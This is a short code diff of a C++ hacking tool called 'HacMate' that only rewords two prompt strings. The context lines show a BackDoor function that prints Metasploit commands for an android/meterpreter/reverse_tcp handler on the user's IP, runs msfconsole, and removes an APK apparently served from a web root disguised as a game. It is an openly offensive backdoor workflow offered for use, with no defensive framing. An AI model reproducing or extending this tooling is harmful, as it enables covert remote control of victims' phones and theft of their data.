@@ -16,7 +16,7 @@ using namespace std;
 
 void Custom_Password_List() {
   char ch;
-  cout<<"\n\n\n\t\t\x1B[34m* Do you want to install required tool (for new user) [Y/N]*\033[0m\t\t\n\n";
+  cout<<"\n\n\n\t\t\x1B[34m* Do you want to install required tool (for new user, using thist tool for 1st time) [Y/N]*\033[0m\t\t\n\n";
   cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
   cin>>ch;
   if(ch == 'Y' || ch == 'y')
@@ -79,7 +79,7 @@ void BackDoor() {
         cout<<"\n\n\n\n\nEnter any Alpha Key if done : ";
         cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
         cin>>ch;
-        cout<<"Use the following command in msf5> console : "<<"\n\n"<<"\tuse exploit/multi/handler\n\n\tset Payload android/meterpreter/reverse_tcp\n\n\tset LHOST "<<ip<<"\n\n\texploit\n\n\n";
+        cout<<"Use the following command in Metasploit msf5> console : "<<"\n\n"<<"\tuse exploit/multi/handler\n\n\tset Payload android/meterpreter/reverse_tcp\n\n\tset LHOST "<<ip<<"\n\n\texploit\n\n\n";
         system("msfconsole");
         system("rm /var/www/html/pgame.apk");
         break;
